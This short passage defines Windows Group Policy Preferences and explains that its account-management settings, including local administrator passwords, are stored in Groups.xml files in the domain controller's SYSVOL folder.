## WHAT IS GROUP POLICY PREFERENCES (GPP)?

A Windows feature that enables administrator to manage operating system and application settings. It has the ability to set passwords for the Local Administrator account. Group Policies for account management are stored on the Domain Controller in `Groups.xml` files buried in the SYSVOL folder.
